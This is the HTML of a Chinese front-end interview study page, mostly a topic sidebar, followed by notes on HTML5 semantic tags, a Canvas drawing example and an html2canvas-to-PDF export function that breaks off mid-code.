class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#对象-类" class="sidebar-link">对象/类</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#es6-class-symbol" class="sidebar-link">ES6/class/Symbol</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#proxy-reflect-set-map" class="sidebar-link">Proxy/Reflect/Set/Map</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#异步" class="sidebar-link">异步</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#优化" class="sidebar-link">优化</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#模块规范" class="sidebar-link">模块规范</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#webpack-10题" class="sidebar-link">webpack[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-构建流程" class="sidebar-link">1:构建流程</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-loader与plugin" class="sidebar-link">2:loader与plugin</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-source-map" class="sidebar-link">3:source map</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-babel原理" class="sidebar-link">4:babel原理</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-按需加载的原理" class="sidebar-link">5:按需加载的原理</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_6-热更新原理" class="sidebar-link">6:热更新原理</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_7-tree-shaking及压缩" class="sidebar-link">7:tree-shaking及压缩</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_8-devserver设置" class="sidebar-link">8:devServer设置</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_9-vue-config-js特殊" class="sidebar-link">9:vue.config.js特殊</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_10-构建优化" class="sidebar-link">10:构建优化</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#nodejs-10题" class="sidebar-link">nodejs[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#队列" class="sidebar-link">队列</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#常用方法-2" class="sidebar-link">常用方法</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#脚手架实现" class="sidebar-link">脚手架实现</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#koajs-10题" class="sidebar-link">koajs[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#compose原理" class="sidebar-link">compose原理</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#eggjs-10题" class="sidebar-link">eggjs[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#使用结构及步骤" class="sidebar-link">使用结构及步骤</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#体系结构" class="sidebar-link">体系结构</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#各层比较" class="sidebar-link">各层比较</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp-ip各层比较" class="sidebar-link">TCP/IP各层比较 !img</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp-ip通信过程" class="sidebar-link">TCP/IP通信过程</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp-udp-10题" class="sidebar-link">TCP/UDP[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#协议简介" class="sidebar-link">协议简介</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp报文段格式" class="sidebar-link">TCP报文段格式</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#udp报文段格式" class="sidebar-link">UDP报文段格式</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp-udp的区别【要点】" class="sidebar-link">TCP/UDP的区别【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp-websocket粘包-拆包" class="sidebar-link">TCP/websocket粘包/拆包</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#tcp三次握手-四次挥手" class="sidebar-link">TCP三次握手/四次挥手</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#socket" class="sidebar-link">Socket</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#http-10题" class="sidebar-link">http[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-报文结构" class="sidebar-link">1:报文结构</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-http版本的比较【要点】" class="sidebar-link">2:http版本的比较【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-http状态码【要点】" class="sidebar-link">3:HTTP状态码【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-http动词" class="sidebar-link">4:HTTP动词</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-完整的http的工作流程【要点】" class="sidebar-link">5:完整的HTTP的工作流程【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_6-cookie-session-token" class="sidebar-link">6:Cookie/Session/Token</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_7-缓存" class="sidebar-link">7:缓存</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_8-https" class="sidebar-link">8:Https</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_9-http中的优化" class="sidebar-link">9:HTTP中的优化</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_10-cdn" class="sidebar-link">10:CDN</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#restful-graphql" class="sidebar-link">RESTful/Graphql</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#restful" class="sidebar-link">RESTful</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#graphql" class="sidebar-link">Graphql</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#websocket" class="sidebar-link">websocket</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-各种协议的关系比较【要点】" class="sidebar-link">1:各种协议的关系比较【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-websocket与http的比较" class="sidebar-link">2:Websocket与Http的比较</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-简介-特点" class="sidebar-link">3:简介/特点</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-协议升级过程【要点】" class="sidebar-link">4:协议升级过程【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-心跳及重连机制【要点】" class="sidebar-link">5:心跳及重连机制【要点】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_6-nginx中兼容设置" class="sidebar-link">6:nginx中兼容设置</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_7-socket-io" class="sidebar-link">7:socket.io</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_8-项目案例实践" class="sidebar-link">8:项目案例实践</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_9-携带header或参数" class="sidebar-link">9:携带header或参数</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_10-stomp" class="sidebar-link">10:STOMP</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#mqtt" class="sidebar-link">MQTT</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_1-简介" class="sidebar-link">1:简介</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_2-工作方式" class="sidebar-link">2:工作方式</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_3-数据包结构" class="sidebar-link">3:数据包结构</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_4-三种消息发布服务质量" class="sidebar-link">4:三种消息发布服务质量</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#_5-中间broker之mosquitto" class="sidebar-link">5:中间broker之Mosquitto</a></li></ul></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#安全-10题" class="sidebar-link">安全[10题]</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#跨域" class="sidebar-link">跨域</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#web安全" class="sidebar-link">Web安全</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#防御简述版【推荐】" class="sidebar-link">防御简述版【推荐】</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#ddos防御" class="sidebar-link">DDos防御</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#接口-ddos-防御" class="sidebar-link">接口(DDOS)防御</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#文件上传漏洞" class="sidebar-link">文件上传漏洞</a></li><li class="sidebar-sub-header"><a href="/rat-summ/pages/zinter-core-sort/#sql注入" class="sidebar-link">SQL注入</a></li></ul></li></ul></li><li><a href="/rat-summ/pages/zinter-core-hard/" class="sidebar-link">核心手写原理精选</a></li><li><a href="/rat-summ/pages/zinter-core-proj/" class="sidebar-link">核心工程项目精选</a></li><li><a href="/rat-summ/pages/c487c5/" class="sidebar-link">面试校招基础</a></li><li><a href="/rat-summ/pages/9c7349/" class="sidebar-link">经验分享</a></li><li><a href="/rat-summ/pages/166fed/" class="sidebar-link">前端面试必读文章</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>简历准备</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/rat-summ/pages/4438dd/" class="sidebar-link">简历准备</a></li></ul></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-33863c7e><div class="articleInfo" data-v-33863c7e><ul class="breadcrumbs" data-v-33863c7e><li data-v-33863c7e><a href="/rat-summ/" title="首页" class="iconfont icon-home router-link-active" data-v-33863c7e></a></li> <li data-v-33863c7e><span data-v-33863c7e>《面试技巧》</span></li> <li data-v-33863c7e><span data-v-33863c7e>技能指南</span></li> <!----></ul> <div class="info" data-v-33863c7e><div title="作者" class="author iconfont icon-touxiang" data-v-33863c7e><a href="https://github.com/samyzh" target="_blank" title="作者" class="beLink" data-v-33863c7e>samy</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-33863c7e><a href="javascript:;" data-v-33863c7e>2021-10-25</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          核心知识点精选
        </h1>  <div class="theme-vdoing-content content__default"><h1 id="最基础部分"><a href="#最基础部分" class="header-anchor">#</a> 最基础部分</h1> <h2 id="html-10题"><a href="#html-10题" class="header-anchor">#</a> html[10题]</h2> <h3 id="_1-新语法及特点"><a href="#_1-新语法及特点" class="header-anchor">#</a> 1:新语法及特点</h3> <h4 id="语法"><a href="#语法" class="header-anchor">#</a> 语法</h4> <ul><li><p>新增语义化标签：nav、header、footer、aside、section、article</p></li> <li><p>音频、视频标签：audio、video</p></li> <li><p>input标签新增属性：placeholder、autocomplete、autofocus、required；</p></li> <li><p><strong>canvas（画布）</strong>、Geolocation（地理定位）</p></li> <li><p><strong>Drag API 拖放</strong>、<strong>websocket（通信协议）</strong></p></li> <li><p><strong>history API</strong>：go、forward、back、pushstate；</p></li> <li><p><strong>数据存储</strong>：localStorage、sessionStorage</p></li></ul> <h4 id="新结构及标签"><a href="#新结构及标签" class="header-anchor">#</a> <strong>新结构及标签</strong></h4> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ie=edge<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>新的网页结构<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>article</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>article</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aside</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aside</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">&gt;</span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="_2-canvas-api"><a href="#_2-canvas-api" class="header-anchor">#</a> 2:Canvas API</h3> <h4 id="基本"><a href="#基本" class="header-anchor">#</a> 基本</h4> <p>利用Canvas API进行绘图，首先要获取canvas元素的上下文，然后用该上下文中封装的各种绘图功能进行绘图。</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>canvas<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>替代内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> canvas <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'canvas'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> context <span class="token operator">=</span>canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">&quot;2d&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取上下文</span>
    <span class="token comment">//设置纯色</span>
    context<span class="token punctuation">.</span>fillStyle <span class="token operator">=</span> <span class="token string">&quot;red&quot;</span><span class="token punctuation">;</span>
    context<span class="token punctuation">.</span>strokeStyle <span class="token operator">=</span> <span class="token string">&quot;blue&quot;</span><span class="token punctuation">;</span>
    <span class="token comment">// 实践表明在不设置fillStyle下的默认fillStyle为black</span>
    context<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 实践表明在不设置strokeStyle下的默认strokeStyle为black</span>
    context<span class="token punctuation">.</span><span class="token function">strokeRect</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h4 id="导出图片及pdf功能"><a href="#导出图片及pdf功能" class="header-anchor">#</a> 导出图片及pdf功能</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> html2Canvas <span class="token keyword">from</span> <span class="token string">'html2canvas'</span><span class="token punctuation">;</span> <span class="token comment">// 注意跟库的版本有很大关系</span>
<span class="token keyword">import</span> JsPDF <span class="token keyword">from</span> <span class="token string">'jspdf'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">htmlToPdf</span><span class="token punctuation">(</span><span class="token parameter">domId<span class="token punctuation">,</span> fileName<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// const target = $(domId); target[0]</span>
  <span class="token keyword">const</span> target <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>domId<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> opts <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment">// useCORS: true,</span>
    <span class="token comment">// allowTaint: true,</span>
    <span class="token comment">// dpi: 96, // option from 192 to 96</span>
    scale<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// window.devicePixelRatio</span>
    width<span class="token operator">:</span> target<span class="token punctuation">.</span>clientWidth<span class="token punctuation">,</span>
    height<span class="token operator">:</span> target<span class="token punctuation">.</span>clientHeight<span class="token punctuation">,</span>
    <span class="token comment">// logging: true,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token comment">//核心：通过html2Canvas把dom信息转化为canvas文件流；</span>
  <span class="token keyword">return</span> <span class="token function">html2Canvas</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> opts<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">canvasN</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pageData <span class="token operator">=</span> canvasN<span class="token punctuation">.</span><span class="token function">toDataURL</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//图片下载情况：原理:添加个a标签主动下载图片路径；</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> objectUrl <span class="token operator">=</span> pageData<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string">'image/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
      a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">,</span> <span class="token string">'display:none'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> objectUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
      a<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'download'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">.jpeg</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      a<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>objectUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> contentWidth <span class="token operator">=</span> canvasN<span class="token punctuation">.</span>width<span class="token punctuation">;</span>
    <span class="token keyword">const</span> contentHeight <span class="token operator">=</span> canvasN<span class="token punctuation">.</span>height<span class="token punctuation">;</span>
    <span class="token keyword">let</span> pdf<span class="token punctuation">;</span>
    <span class="token comment">//pdf情况：JsPDF处理流；分页再save保存下载；</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> pageHeight <span class="token operator">=</span> <span class="token punctuation">(</span>contentWidth <span class="token operator">/</span> <span class="token number">592.28</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">841.89</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> leftHeight <span class="token operator">=</span> contentHeight<span class="token punctuation">;</span>
      <span class="token keyword">let</span> position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 页面偏移</span>
      <span class="token keyword">const</span> imgWidth <span class="token operator">=</span> <span class="token number">595.28</span><span class="token punctuation">;</span> <span class="token comment">// a4纸的尺寸[595.28,841.89]，html页面生成的canvas在pdf中图片的宽高</span>
